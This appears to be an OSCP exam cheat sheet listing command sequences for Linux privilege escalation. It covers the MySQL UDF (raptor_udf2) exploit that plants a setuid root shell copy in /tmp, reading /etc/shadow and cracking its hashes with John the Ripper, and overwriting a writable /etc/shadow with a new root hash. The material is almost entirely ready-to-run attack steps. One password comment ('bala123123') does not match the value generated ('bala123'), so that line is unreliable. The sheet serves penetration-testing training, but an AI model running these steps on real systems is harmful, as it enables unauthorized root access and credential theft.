### oscp-cheatsheet

## Linux Privilege Escalation

# Serice Exploit - MySQL UDF Exploit

https://www.exploit-db.com/exploits/1518

ps aux | grep mysql
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root
use mysql;
Select * from mysql.func;  #to list the user defined functions
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
/tmp/rootbash -p

# Weak File Permission - /etc/shadow Readable

ls -la /etc/shadow            #to view the permission of /etc/shadow
cat /etc/shadow               #to view the shadow file
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
su root                       #login with cracked password 'password123'
whoami;id;pwd

# weak File Permission - /etc/shadow Writable

ls -la /etc/shadow
mkpasswd -m sha-512 bala123
nano /etc/shadow
su root                           #login with custom password 'bala123123'
whoami;id;pwd
